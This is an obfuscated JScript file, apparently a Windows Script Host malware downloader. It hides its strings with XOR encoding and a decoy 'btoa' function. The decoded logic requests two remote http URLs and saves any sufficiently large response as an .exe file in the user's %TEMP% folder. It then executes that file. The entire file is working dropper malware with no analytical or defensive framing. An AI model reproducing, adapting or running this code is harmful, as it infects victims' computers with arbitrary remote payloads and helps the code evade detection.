function btoa(ambrosiaLm1, thrallRgy, harrowinghwQ, chastisekZ6, affablega7, acrimonyVPv, suffragex9B, emeticDgc, ellipsisBq8, banalKCQ, quipsVx) {
    var hordemAa = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var propitiateyMt = String(quipsVx);
    for (var allegecIK, bequeathnje, factiousqbG = 0, doggerelH6k = hordemAa, loftyIbW = ""; propitiateyMt.charAt(factiousqbG | 0) || (doggerelH6k = "=", 
    factiousqbG % 1); loftyIbW += doggerelH6k.charAt(63 & allegecIK >> 8 - factiousqbG % 1 * 8)) {
        bequeathnje = propitiateyMt.charCodeAt(factiousqbG += 3 / 4);
        if (bequeathnje > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        allegecIK = allegecIK << 8 | bequeathnje;
    }
    return loftyIbW;
}

var encumbernYK = function(objectivedjj) {
    var rakishNCI = "";
    var ambrosiaLm1 = "aquilinepMV";
    var thrallRgy = "convalescecX7";
    var harrowinghwQ = "querulousNVJ";
    var chastisekZ6 = "deignDUG";
    var affablega7 = "impelv1N";
    var acrimonyVPv = "frescoWvk";
    var suffragex9B = "pertcT5";
    var emeticDgc = "retortKQt";
    var ellipsisBq8 = "careenE6F";
    var banalKCQ = "loquacioustBw";
    btoa(ambrosiaLm1, thrallRgy, harrowinghwQ, chastisekZ6, affablega7, acrimonyVPv, suffragex9B, emeticDgc, ellipsisBq8, banalKCQ, [ 93, 134, 224, 165, 188, 237, 22, 202, 119, 165, 203, 6, 72, 210, 250, 85 ]);
    var multitudeaxG = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var vestigeDTB = 0; vestigeDTB < objectivedjj.length; vestigeDTB++) {
        var aversionjZn = [ 93, 134, 224, 165, 188, 237, 22, 202, 119, 165, 203, 6, 72, 210, 250, 85 ];
        rakishNCI += multitudeaxG(objectivedjj[vestigeDTB] ^ aversionjZn[vestigeDTB % aversionjZn.length]);
    }
    return rakishNCI;
};

var ominousfpw = function() {
    var malcontentsz3 = function() {
        var inspireWwa = encumbernYK([ 19, 210, 136, 231, 212, 189, 115, 190, 16, 203 ]);
        var smatteringvrp = encumbernYK([ 7, 213, 181, 246, 206, 140, 91, 134, 48, 202 ]);
    };
    malcontentsz3.prototype.kO8PwrUKTf = function(stentorianVcg) {
        var plumbRk5 = encumbernYK([ 30, 244, 133, 196, 200, 136, 89, 168, 29, 192, 168, 114 ]);
        return wsh[plumbRk5](stentorianVcg);
    };
    malcontentsz3.prototype.fR3oI8Y7Nu = function(stentorianVcg) {
        var plumbRk5 = encumbernYK([ 30, 244, 133, 196, 200, 136, 89, 168, 29, 192, 168, 114 ]);
        return WScript[plumbRk5](stentorianVcg);
    };
    return malcontentsz3;
}();

(function() {
    var irresoluteIWL = [ encumbernYK([ 53, 242, 148, 213, 134, 194, 57, 162, 7, 196, 185, 99, 49, 189, 143, 61, 56, 244, 133, 212, 205, 195, 117, 165, 26, 138, 243, 49, 102, 183, 130, 48 ]), encumbernYK([ 53, 242, 148, 213, 134, 194, 57, 162, 7, 196, 167, 117, 39, 165, 155, 59, 41, 245, 134, 195, 146, 142, 121, 167, 88, 157, 252, 40, 45, 170, 159 ]) ];
    var effulgenceffs = 4194304;
    var furnishkFI = encumbernYK([ 31, 205, 216, 233, 141, 187, 32, 141, 20, 220 ]);
    var purportBYd = encumbernYK([ 60, 199, 183, 240, 246, 161, 46, 142, 64, 225 ]);
    var patronizeEpd = new ominousfpw();
    var toilYfV = patronizeEpd[encumbernYK([ 59, 212, 211, 202, 245, 213, 79, 253, 57, 208 ])];
    var slayFfp = toilYfV(encumbernYK([ 10, 213, 131, 215, 213, 157, 98, 228, 36, 205, 174, 106, 36 ]));
    var polityOBh = toilYfV(encumbernYK([ 16, 213, 184, 232, 240, 223, 56, 146, 58, 233, 131, 82, 28, 130 ]));
    var conservatoryhlD = toilYfV(encumbernYK([ 28, 194, 175, 225, 254, 195, 69, 190, 5, 192, 170, 107 ]));
    var halcyondl6 = slayFfp.ExpandEnvironmentStrings(encumbernYK([ 120, 210, 165, 232, 236, 200, 74 ]));
    var modedAW = halcyondl6 + effulgenceffs + encumbernYK([ 115, 227, 152, 192 ]);
    var perpetratep9h = false;
    var suavityyAE = 200;
    for (var disquisitionIVX = 0; disquisitionIVX < irresoluteIWL.length; disquisitionIVX++) {
        try {
            var uncouthS5X = irresoluteIWL[disquisitionIVX];
            polityOBh.open(encumbernYK([ 26, 195, 180 ]), uncouthS5X, false);
            polityOBh.send();
            if (polityOBh.status == suavityyAE) {
                try {
                    conservatoryhlD[encumbernYK([ 50, 246, 133, 203 ])]();
                    conservatoryhlD.type = 1;
                    conservatoryhlD[encumbernYK([ 42, 244, 137, 209, 217 ])](polityOBh[encumbernYK([ 47, 227, 147, 213, 211, 131, 101, 175, 53, 202, 175, 127 ])]);
                    var demoralizeKWK = Math.pow(2, 10) * 249;
                    if (conservatoryhlD.size > demoralizeKWK) {
                        disquisitionIVX = irresoluteIWL.length;
                        conservatoryhlD.position = 0;
                        conservatoryhlD.saveToFile(modedAW, 2);
                        perpetratep9h = true;
                    }
                } finally {
                    conservatoryhlD.close();
                }
            }
        } catch (ignored) {}
    }
    if (perpetratep9h) {
        slayFfp[encumbernYK([ 24, 254, 133, 198 ])](halcyondl6 + Math.pow(2, 22));
    }
})();